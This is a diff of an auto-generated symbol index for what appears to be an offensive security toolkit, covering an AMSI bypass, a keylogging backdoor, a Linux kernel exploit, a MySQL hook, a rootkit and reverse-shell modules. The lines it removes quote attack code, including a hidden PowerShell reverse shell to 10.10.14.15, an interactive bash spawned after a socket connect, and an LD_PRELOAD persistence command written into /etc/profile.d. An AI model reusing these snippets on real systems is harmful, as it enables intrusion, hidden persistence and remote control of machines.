@@ -18479,24 +18479,7 @@
 - Doc: 7
 
 ### main (function) `int main(int argc, char** argv)`
-- Defined: `modules/amsi.c:427`
-
-### NTSTATUS (function) `typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);`
-- Defined: `modules/amsi.c:19`
-- Doc: Declaraciones de los punteros a las funciones
-
-### printf (function) `printf("Failed to get procedure address\n");`
-- Defined: `modules/amsi.c:44`
-
-### exit (function) `exit(1);`
-- Defined: `modules/amsi.c:45`
-
-### ZeroMemory (function) `ZeroMemory(Patch, 100);`
-- Defined: `modules/amsi.c:72`
-
-### lstrcatA (function) `lstrcatA(Patch, "\x75");`
-- Defined: `modules/amsi.c:75`
-- Doc: Pegando el código de operación jne
+- Defined: `modules/amsi.c:428`
 
 ## modules/amt_auth_bypass.py
 
@@ -19188,84 +19171,20 @@
 ## modules/backdoor/backdoor.c
 
 ### bootRun (function) `int bootRun()`
-- Defined: `modules/backdoor/backdoor.c:17`
+- Defined: `modules/backdoor/backdoor.c:18`
 - Depends on: `modules/backdoor/keylogger.h`
 
 ### str_cut (function) `char *
 str_cut(char str[], int slice_from, int slice_to)`
-- Defined: `modules/backdoor/backdoor.c:47`
+- Defined: `modules/backdoor/backdoor.c:49`
 - Depends on: `modules/backdoor/keylogger.h`
 
 ### Shell (function) `void Shell()`
-- Defined: `modules/backdoor/backdoor.c:83`
+- Defined: `modules/backdoor/backdoor.c:84`
 - Depends on: `modules/backdoor/keylogger.h`
 
 ### WinMain (function) `int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)`
-- Defined: `modules/backdoor/backdoor.c:124`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### send (function) `send(sock, err, sizeof(err), 0);`
-- Defined: `modules/backdoor/backdoor.c:27`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### RegCloseKey (function) `RegCloseKey(NewVal);`
-- Defined: `modules/backdoor/backdoor.c:39`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### strncpy (function) `strncpy(buffer, str, buffer_len);`
-- Defined: `modules/backdoor/backdoor.c:80`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### bzero (function) `jump: bzero(buffer, 1024);`
-- Defined: `modules/backdoor/backdoor.c:90`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### recv (function) `recv(sock, buffer, 1024, 0);`
-- Defined: `modules/backdoor/backdoor.c:94`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### closesocket (function) `closesocket(sock);`
-- Defined: `modules/backdoor/backdoor.c:97`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### WSACleanup (function) `WSACleanup();`
-- Defined: `modules/backdoor/backdoor.c:98`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### exit (function) `exit(0);`
-- Defined: `modules/backdoor/backdoor.c:99`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### chdir (function) `chdir(str_cut(buffer, 3, 100));`
-- Defined: `modules/backdoor/backdoor.c:102`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### strcat (function) `strcat(total_response, container);`
-- Defined: `modules/backdoor/backdoor.c:115`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### fclose (function) `fclose(fp);`
-- Defined: `modules/backdoor/backdoor.c:118`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### AllocConsole (function) `AllocConsole();`
-- Defined: `modules/backdoor/backdoor.c:128`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### ShowWindow (function) `ShowWindow(stealth, 0);`
-- Defined: `modules/backdoor/backdoor.c:130`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### memset (function) `memset(&ServAddr, 0, sizeof(ServAddr));`
-- Defined: `modules/backdoor/backdoor.c:146`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### Sleep (function) `Sleep(10);`
-- Defined: `modules/backdoor/backdoor.c:155`
-- Depends on: `modules/backdoor/keylogger.h`
-
-### MessageBox (function) `MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);`
-- Defined: `modules/backdoor/backdoor.c:158`
+- Defined: `modules/backdoor/backdoor.c:125`
 - Depends on: `modules/backdoor/keylogger.h`
 
 ## modules/backdoor/keylogger.h
@@ -19274,52 +19193,10 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/backdoor/keylogger.h:1`
 - Imported by: `modules/backdoor/backdoor.c`
 
-### Sleep (function) `Sleep(10);`
-- Defined: `modules/backdoor/keylogger.h:22`
-- Doc: : take rest for 10 millisecond
-- Imported by: `modules/backdoor/backdoor.c`
-
-### putc (function) `putc(showKey,kh);`
-- Defined: `modules/backdoor/keylogger.h:96`
-- Imported by: `modules/backdoor/backdoor.c`
-
-### fclose (function) `fclose(kh);`
-- Defined: `modules/backdoor/keylogger.h:97`
-- Imported by: `modules/backdoor/backdoor.c`
-
 ## modules/backdoor/server.c
 
 ### main (function) `int main()`
-- Defined: `modules/backdoor/server.c:9`
-- Doc: include <stdio.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <stdlib.h> include <string
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### printf (function) `printf("Error Setting TCP Socket Options!\n");`
-- Defined: `modules/backdoor/server.c:22`
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### bzero (function) `jump: bzero(&buffer, sizeof(buffer));`
-- Defined: `modules/backdoor/server.c:54`
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### fgets (function) `fgets(buffer, sizeof(buffer), stdin);`
-- Defined: `modules/backdoor/server.c:58`
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### strtok (function) `strtok(buffer, "\n");`
-- Defined: `modules/backdoor/server.c:59`
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### write (function) `write(client_socket, buffer, sizeof(buffer));`
-- Defined: `modules/backdoor/server.c:60`
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### recv (function) `recv(client_socket, response, sizeof(response), 0);`
-- Defined: `modules/backdoor/server.c:71`
-- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
-
-### close (function) `close(client_socket);`
-- Defined: `modules/backdoor/server.c:80`
+- Defined: `modules/backdoor/server.c:10`
 - Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
 
 ## modules/beacon_config_builder.py
@@ -23090,208 +22967,106 @@ str_cut(char str[], int slice_from, int slice_to)`
 ## modules/exp.c
 
 ### add_key (function) `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...`
-- Defined: `modules/exp.c:144`
+- Defined: `modules/exp.c:147`
 
 ### keyctl (function) `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...`
-- Defined: `modules/exp.c:150`
+- Defined: `modules/exp.c:151`
 
 ### bye (function) `void bye(char *info)`
-- Defined: `modules/exp.c:154`
+- Defined: `modules/exp.c:155`
 
 ### do_error_exit (function) `void do_error_exit(char *info)`
-- Defined: `modules/exp.c:160`
+- Defined: `modules/exp.c:161`
 
 ### bye2 (function) `void bye2(char *info, char *arg)`
-- Defined: `modules/exp.c:166`
+- Defined: `modules/exp.c:167`
 
 ### spray_keyring (function) `key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)`
-- Defined: `modules/exp.c:171`
+- Defined: `modules/exp.c:172`
 
 ### spray_keyring_list_del_purpose (function) `key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, u...`
-- Defined: `modules/exp.c:189`
+- Defined: `modules/exp.c:190`
 
 ### spray_keyring_list_overwrite_purpose (function) `key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t of...`
-- Defined: `modules/exp.c:213`
+- Defined: `modules/exp.c:214`
 
 ### get_keyring_leak (function) `int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)`
-- Defined: `modules/exp.c:247`
+- Defined: `modules/exp.c:248`
 
 ### awake_partial_keys (function) `void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx)`
-- Defined: `modules/exp.c:270`
+- Defined: `modules/exp.c:271`
 
 ### release_keys (function) `void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)`
-- Defined: `modules/exp.c:276`
+- Defined: `modules/exp.c:279`
 
 ### release_partial_keys (function) `void release_partial_keys(key_serial_t *id_buffer, int i)`
-- Defined: `modules/exp.c:289`
+- Defined: `modules/exp.c:290`
 
 ### unshare_setup (function) `void unshare_setup(uid_t uid, gid_t gid)`
-- Defined: `modules/exp.c:295`
+- Defined: `modules/exp.c:297`
 
 ### set_stable_table_and_set (function) `void set_stable_table_and_set(struct mnl_socket* nl, const char *name)`
-- Defined: `modules/exp.c:320`
+- Defined: `modules/exp.c:322`
 
 ### set_trigger_set_and_overwrite (function) `void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)`
-- Defined: `modules/exp.c:384`
+- Defined: `modules/exp.c:385`
 
 ### set_cpu_affinity (function) `void set_cpu_affinity(int cpu_n, pid_t pid)`
-- Defined: `modules/exp.c:437`
+- Defined: `modules/exp.c:438`
 
 ### spray_mqueue (function) `void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)`
-- Defined: `modules/exp.c:447`
+- Defined: `modules/exp.c:448`
 
 ### gather_mqueue (function) `int gather_mqueue(mqd_t mqdes, int gather_size)`
-- Defined: `modules/exp.c:462`
+- Defined: `modules/exp.c:463`
 
 ### gather_mqueue_nosave (function) `int gather_mqueue_nosave(mqd_t mqdes, int gather_size)`
-- Defined: `modules/exp.c:484`
+- Defined: `modules/exp.c:485`
 
 ### spray_msg_msg (function) `void spray_msg_msg(unsigned int size, unsigned int amount, int qid)`
-- Defined: `modules/exp.c:495`
+- Defined: `modules/exp.c:496`
 
 ### io_uring_setup (function) `static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p)`
-- Defined: `modules/exp.c:519`
+- Defined: `modules/exp.c:520`
 
 ### io_uring_register (function) `static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args)`
-- Defined: `modules/exp.c:523`
+- Defined: `modules/exp.c:524`
 
 ### spray_uring (function) `struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer)`
-- Defined: `modules/exp.c:527`
+- Defined: `modules/exp.c:529`
 
 ### release_uring (function) `void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size)`
-- Defined: `modules/exp.c:545`
+- Defined: `modules/exp.c:546`
 
 ### release_partial_uring (function) `void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx)`
-- Defined: `modules/exp.c:553`
+- Defined: `modules/exp.c:554`
 
 ### prepare_root_shell (function) `void prepare_root_shell(void)`
-- Defined: `modules/exp.c:558`
+- Defined: `modules/exp.c:559`
 
 ### create_dummy_file (function) `void create_dummy_file(void)`
-- Defined: `modules/exp.c:563`
+- Defined: `modules/exp.c:564`
 
 ### create_priv_file (function) `void create_priv_file(void)`
-- Defined: `modules/exp.c:571`
+- Defined: `modules/exp.c:572`
 
 ### write_new_modprobe (function) `void write_new_modprobe()`
-- Defined: `modules/exp.c:581`
+- Defined: `modules/exp.c:582`
 
 ### setup_modprobe_payload (function) `void setup_modprobe_payload()`
-- Defined: `modules/exp.c:600`
+- Defined: `modules/exp.c:601`
 
 ### userland_T (function) `void userland_T(int *sema)`
-- Defined: `modules/exp.c:604`
+- Defined: `modules/exp.c:605`
 
 ### sema_up (function) `void sema_up(int *sema)`
-- Defined: `modules/exp.c:609`
+- Defined: `modules/exp.c:610`
 
 ### sema_down (function) `void sema_down(int *sema)`
-- Defined: `modules/exp.c:614`
+- Defined: `modules/exp.c:615`
 
 ### main (function) `int main(int argc, char ** argv)`
-- Defined: `modules/exp.c:619`
-
-### syscall (function) `return syscall(__NR_add_key, type, description, payload, plen, ringid);`
-- Defined: `modules/exp.c:148`
-
-### puts (function) `puts(info);`
-- Defined: `modules/exp.c:157`
-
-### exit (function) `exit(-2);`
-- Defined: `modules/exp.c:158`
-
-### printf (function) `printf(info, arg);`
-- Defined: `modules/exp.c:169`
-
-### snprintf (function) `snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);`
-- Defined: `modules/exp.c:181`
-
-### memcpy (function) `memcpy(temp+0x0, &next, 8);`
-- Defined: `modules/exp.c:197`
-
-### free (function) `free(id_buffer);`
-- Defined: `modules/exp.c:286`
-
-### unshare (function) `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);`
-- Defined: `modules/exp.c:301`
-
-### write (function) `write(temp, "deny", strlen("deny"));`
-- Defined: `modules/exp.c:305`
-
-### close (function) `close(temp);`
-- Defined: `modules/exp.c:306`
-
-### nftnl_table_set_str (function) `nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);`
-- Defined: `modules/exp.c:331`
-
-### nftnl_table_set_u32 (function) `nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);`
-- Defined: `modules/exp.c:332`
-
-### nftnl_set_set_str (function) `nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);`
-- Defined: `modules/exp.c:336`
-
-### nftnl_set_set_u32 (function) `nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);`
-- Defined: `modules/exp.c:338`
-
-### nftnl_batch_begin (function) `nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);`
-- Defined: `modules/exp.c:351`
-
-### mnl_nlmsg_batch_next (function) `mnl_nlmsg_batch_next(batch);`
-- Defined: `modules/exp.c:353`
-
-### nftnl_table_nlmsg_build_payload (function) `nftnl_table_nlmsg_build_payload(nlh, table);`
-- Defined: `modules/exp.c:360`
-
-### nftnl_set_nlmsg_build_payload (function) `nftnl_set_nlmsg_build_payload(nlh, set_stable);`
-- Defined: `modules/exp.c:367`
-
-### nftnl_set_free (function) `nftnl_set_free(set_stable);`
-- Defined: `modules/exp.c:368`
-
-### nftnl_batch_end (function) `nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);`
-- Defined: `modules/exp.c:370`
-
-### err (function) `err(1, "mnl_socket_open");`
-- Defined: `modules/exp.c:375`
-
-### nftnl_expr_set_str (function) `nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");`
-- Defined: `modules/exp.c:403`
-
-### nftnl_expr_set_u32 (function) `nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);`
-- Defined: `modules/exp.c:404`
-
-### nftnl_set_add_expr (function) `nftnl_set_add_expr(set_trigger, exprs[exprid]);`
-- Defined: `modules/exp.c:405`
-
-### CPU_ZERO (function) `CPU_ZERO(&set);`
-- Defined: `modules/exp.c:440`
-
-### CPU_SET (function) `CPU_SET(cpu_n, &set);`
-- Defined: `modules/exp.c:442`
-
-### mq_receive (function) `mq_receive(mqdes, (char*) &msg, BUFFER, NULL);`
-- Defined: `modules/exp.c:491`
-
-### memset (function) `memset(spray->mtext, 0x41, size - 0x30);`
-- Defined: `modules/exp.c:504`
-
-### perror (function) `perror("msgsend failure");`
-- Defined: `modules/exp.c:513`
-
-### system (function) `system("gcc -o /tmp/shell /tmp/shell.c -w");`
-- Defined: `modules/exp.c:578`
-
-### read (function) `read(fd_modprobe, modprobe_name, 14);`
-- Defined: `modules/exp.c:588`
-
-### setvbuf (function) `setvbuf(stdin, 0, 2, 0);`
-- Defined: `modules/exp.c:622`
-
-### sleep (function) `sleep(1);`
-- Defined: `modules/exp.c:646`
-
-### execve (function) `execve("/tmp/dummy", NULL, NULL);`
-- Defined: `modules/exp.c:649`
+- Defined: `modules/exp.c:620`
 
 ## modules/exploit_chain.py
 
@@ -29739,34 +29514,6 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/mysql_hookandroot_lib.c:128`
 - Doc: execvp() hook
 
-### ssize_t (function) `typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);`
-- Defined: `modules/mysql_hookandroot_lib.c:69`
-
-### connect (function) `connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));`
-- Defined: `modules/mysql_hookandroot_lib.c:85`
-
-### execle (function) `execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );`
-- Defined: `modules/mysql_hookandroot_lib.c:88`
-
-### exit (function) `exit(0);`
-- Defined: `modules/mysql_hookandroot_lib.c:89`
-
-### fgets (function) `fgets(buffer, sizeof(buffer), conf);`
-- Defined: `modules/mysql_hookandroot_lib.c:114`
-
-### fclose (function) `fclose(conf);`
-- Defined: `modules/mysql_hookandroot_lib.c:121`
-
-### close (function) `close(fd);`
-- Defined: `modules/mysql_hookandroot_lib.c:135`
-
-### config_cleanup (function) `config_cleanup();`
-- Defined: `modules/mysql_hookandroot_lib.c:145`
-- Doc: clean injected payload before mysqld is started
-
-### old_execvp (function) `return old_execvp(filename, argv);`
-- Defined: `modules/mysql_hookandroot_lib.c:146`
-
 ## modules/network_opsec.py
 
 ### __init__ (method) `def __init__(self, config)`
@@ -31943,32 +31690,15 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Doc: call_usermodehelper function is used to create user mode processes from kernel space
 
 ### reverse_shell_exit (function) `static void __exit reverse_shell_exit(void)`
-- Defined: `modules/reverse-shell.c:15`
-
-### call_usermodehelper (function) `return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
-- Defined: `modules/reverse-shell.c:13`
-
-### printk (function) `printk(KERN_INFO "Exiting\n");`
-- Defined: `modules/reverse-shell.c:17`
-
-### module_init (function) `module_init(reverse_shell_init);`
-- Defined: `modules/reverse-shell.c:19`
+- Defined: `modules/reverse-shell.c:16`
 
 ## modules/revshell.c
 
 ### xlAutoOpen (function) `void __cdecl xlAutoOpen()`
-- Defined: `modules/revshell.c:4`
+- Defined: `modules/revshell.c:5`
 
 ### DllMain (function) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
-- Defined: `modules/revshell.c:9`
-
-### __declspec (function) `__declspec(dllexport) void __cdecl xlAutoOpen(void);`
-- Defined: `modules/revshell.c:2`
-- Doc: include <windows.h>
-
-### WinExec (function) `WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.15', 443);`
-- Defined: `modules/revshell.c:7`
-- Doc: Triggers when Excel opens
+- Defined: `modules/revshell.c:10`
 
 ## modules/rich_tui.py
 
@@ -32192,7 +31922,7 @@ str_cut(char str[], int slice_from, int slice_to)`
 ## modules/rootkit/mr.c
 
 ### get_ld_preload (function) `char *get_ld_preload()`
-- Defined: `modules/rootkit/mr.c:83`
+- Defined: `modules/rootkit/mr.c:84`
 
 ### set_ld_preload (function) `void set_ld_preload(const char *ld_preload)`
 - Defined: `modules/rootkit/mr.c:87`
@@ -32204,31 +31934,31 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/rootkit/mr.c:117`
 
 ### check_elevate (function) `int check_elevate()`
-- Defined: `modules/rootkit/mr.c:135`
+- Defined: `modules/rootkit/mr.c:136`
 
 ### write_file (function) `void write_file(const char *path, const char *content, mode_t mode)`
-- Defined: `modules/rootkit/mr.c:144`
+- Defined: `modules/rootkit/mr.c:145`
 
 ### crontab (function) `void crontab(const char *path)`
-- Defined: `modules/rootkit/mr.c:155`
+- Defined: `modules/rootkit/mr.c:156`
 
 ### generate_random_string (function) `char *generate_random_string()`
-- Defined: `modules/rootkit/mr.c:167`
+- Defined: `modules/rootkit/mr.c:168`
 
 ### xdg (function) `void xdg(const char *path, int admin)`
-- Defined: `modules/rootkit/mr.c:177`
+- Defined: `modules/rootkit/mr.c:178`
 
 ### kde_plasma (function) `void kde_plasma(const char *path)`
-- Defined: `modules/rootkit/mr.c:199`
+- Defined: `modules/rootkit/mr.c:200`
 
 ### copy_binary (function) `void copy_binary(const char *source, const char *destination)`
-- Defined: `modules/rootkit/mr.c:214`
+- Defined: `modules/rootkit/mr.c:215`
 
 ### persist (function) `void persist(const char *path)`
-- Defined: `modules/rootkit/mr.c:233`
+- Defined: `modules/rootkit/mr.c:234`
 
 ### ensure_key_file_exists (function) `void ensure_key_file_exists()`
-- Defined: `modules/rootkit/mr.c:250`
+- Defined: `modules/rootkit/mr.c:253`
 
 ### ensure_hide_file_exists (function) `void ensure_hide_file_exists()`
 - Defined: `modules/rootkit/mr.c:271`
@@ -32240,153 +31970,54 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/rootkit/mr.c:303`
 
 ### unload_rootkit (function) `void unload_rootkit()`
-- Defined: `modules/rootkit/mr.c:313`
+- Defined: `modules/rootkit/mr.c:314`
 
 ### handle_client (function) `void *handle_client(void *client_socket)`
 - Defined: `modules/rootkit/mr.c:321`
 
 ### mon_shell (function) `void *mon_shell(void *data)`
-- Defined: `modules/rootkit/mr.c:520`
+- Defined: `modules/rootkit/mr.c:521`
 
 ### signal_handler (function) `void signal_handler(int signum)`
-- Defined: `modules/rootkit/mr.c:608`
+- Defined: `modules/rootkit/mr.c:609`
 
 ### reboot_system (function) `void reboot_system()`
-- Defined: `modules/rootkit/mr.c:614`
+- Defined: `modules/rootkit/mr.c:615`
 
 ### main (function) `int main()`
-- Defined: `modules/rootkit/mr.c:638`
-
-### getenv (function) `return getenv("LD_PRELOAD");`
-- Defined: `modules/rootkit/mr.c:85`
-
-### fprintf (function) `fprintf(profile, "export LD_PRELOAD=%s\n", ld_preload);`
-- Defined: `modules/rootkit/mr.c:90`
-
-### fclose (function) `fclose(profile);`
-- Defined: `modules/rootkit/mr.c:91`
-
-### printf (function) `printf("LD_PRELOAD setted as %s\n", DESIRED_LD_PRELOAD);`
-- Defined: `modules/rootkit/mr.c:103`
-
-### execl (function) `execl("/bin/bash", "bash", "-c", "sudo bash -c 'echo \"export LD_PRELOAD=/home/.grisun0/mrhyde.so\" > /etc/profile.d/ld_preload.sh'", (char *)NULL);`
-- Defined: `modules/rootkit/mr.c:107`
-
-### perror (function) `perror("execl failed");`
-- Defined: `modules/rootkit/mr.c:108`
-
-### exit (function) `exit(EXIT_FAILURE);`
-- Defined: `modules/rootkit/mr.c:109`
-
-### waitpid (function) `waitpid(pid, NULL, 0);`
-- Defined: `modules/rootkit/mr.c:113`
-
-### pclose (function) `pclose(cmd);`
-- Defined: `modules/rootkit/mr.c:130`
-
-### chmod (function) `chmod(path, mode);`
-- Defined: `modules/rootkit/mr.c:153`
-
-### snprintf (function) `snprintf(command, sizeof(command), "@reboot %s\n", path);`
-- Defined: `modules/rootkit/mr.c:159`
-
-### system (function) `system(command);`
-- Defined: `modules/rootkit/mr.c:163`
-
-### remove (function) `remove(tmp_path);`
-- Defined: `modules/rootkit/mr.c:164`
-
-### srand (function) `srand(time(NULL));`
-- Defined: `modules/rootkit/mr.c:169`
-
-### free (function) `free(filename);`
-- Defined: `modules/rootkit/mr.c:197`
-
-### fwrite (function) `fwrite(buffer, 1, bytesRead, dest);`
-- Defined: `modules/rootkit/mr.c:226`
-
-### mkdir (function) `mkdir(dirname(new_path), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);`
-- Defined: `modules/rootkit/mr.c:247`
-
-### dlclose (function) `dlclose(rootkit_handle);`
-- Defined: `modules/rootkit/mr.c:316`
-
-### send (function) `send(sock, "Enter password: ", 16, 0);`
-- Defined: `modules/rootkit/mr.c:328`
-
-### memset (function) `memset(buffer, 0, BUFFER_SIZE);`
-- Defined: `modules/rootkit/mr.c:330`
-
-### close (function) `close(sock);`
-- Defined: `modules/rootkit/mr.c:332`
-
-### pthread_exit (function) `pthread_exit(NULL);`
-- Defined: `modules/rootkit/mr.c:333`
-
-### execvp (function) `execvp("bash", command_args);`
-- Defined: `modules/rootkit/mr.c:387`
-
-### raise (function) `raise(SIGTERM);`
-- Defined: `modules/rootkit/mr.c:440`
-
-### unsetenv (function) `unsetenv("LD_PRELOAD");`
-- Defined: `modules/rootkit/mr.c:455`
-
-### time (function) `time(&current_time);`
-- Defined: `modules/rootkit/mr.c:491`
-
-### sleep (function) `sleep(1);`
-- Defined: `modules/rootkit/mr.c:527`
-
-### closedir (function) `closedir(dir);`
-- Defined: `modules/rootkit/mr.c:558`
-
-### setsid (function) `setsid();`
-- Defined: `modules/rootkit/mr.c:565`
-
-### setenv (function) `setenv("LD_PRELOAD", DESIRED_LD_PRELOAD, 1);`
-- Defined: `modules/rootkit/mr.c:578`
-
-### signal (function) `signal(SIGTERM, signal_handler);`
-- Defined: `modules/rootkit/mr.c:655`
-
-### pthread_detach (function) `pthread_detach(client_thread);`
-- Defined: `modules/rootkit/mr.c:703`
-
-### pthread_join (function) `pthread_join(mon_thread, NULL);`
-- Defined: `modules/rootkit/mr.c:707`
+- Defined: `modules/rootkit/mr.c:639`
 
 ## modules/rootkit/mrhyde.c
 
 ### load_hidden_pids (function) `void load_hidden_pids()`
-- Defined: `modules/rootkit/mrhyde.c:72`
+- Defined: `modules/rootkit/mrhyde.c:73`
 
 ### load_hidden_files (function) `void load_hidden_files()`
-- Defined: `modules/rootkit/mrhyde.c:92`
+- Defined: `modules/rootkit/mrhyde.c:93`
 
 ### unlink (function) `int unlink(const char *pathname)`
-- Defined: `modules/rootkit/mrhyde.c:112`
+- Defined: `modules/rootkit/mrhyde.c:113`
 
 ### kill (function) `int kill(pid_t pid, int sig)`
-- Defined: `modules/rootkit/mrhyde.c:124`
+- Defined: `modules/rootkit/mrhyde.c:125`
 
 ### remove (function) `int remove(const char *pathname)`
-- Defined: `modules/rootkit/mrhyde.c:144`
+- Defined: `modules/rootkit/mrhyde.c:145`
 
 ### unlinkat (function) `int unlinkat(int dirfd, const char *pathname, int flags)`
-- Defined: `modules/rootkit/mrhyde.c:156`
+- Defined: `modules/rootkit/mrhyde.c:157`
 
 ### get_username_from_pid (function) `char* get_username_from_pid(pid_t pid)`
-- Defined: `modules/rootkit/mrhyde.c:177`
+- Defined: `modules/rootkit/mrhyde.c:178`
 
 ### should_hide_pid (function) `int should_hide_pid(const char* pid)`
-- Defined: `modules/rootkit/mrhyde.c:196`
+- Defined: `modules/rootkit/mrhyde.c:197`
 
 ### should_hide_file (function) `int should_hide_file(const char* filename)`
-- Defined: `modules/rootkit/mrhyde.c:211`
+- Defined: `modules/rootkit/mrhyde.c:212`
 
 ### readdir (function) `struct dirent* readdir(DIR* dirp)`
-- Defined: `modules/rootkit/mrhyde.c:221`
+- Defined: `modules/rootkit/mrhyde.c:222`
 
 ### fopen (function) `FILE *fopen(const char *pathname, const char *mode)`
 - Defined: `modules/rootkit/mrhyde.c:283`
@@ -32413,87 +32044,33 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/rootkit/mrhyde.c:618`
 
 ### main (function) `int main()`
-- Defined: `modules/rootkit/mrhyde.c:677`
-
-### int (function) `typedef int (*orig_unlink_f_type)(const char *pathname);`
-- Defined: `modules/rootkit/mrhyde.c:54`
-
-### perror (function) `perror("Error opening PID file");`
-- Defined: `modules/rootkit/mrhyde.c:76`
-
-### fclose (function) `fclose(file);`
-- Defined: `modules/rootkit/mrhyde.c:89`
-
-### orig_unlink (function) `return orig_unlink(pathname);`
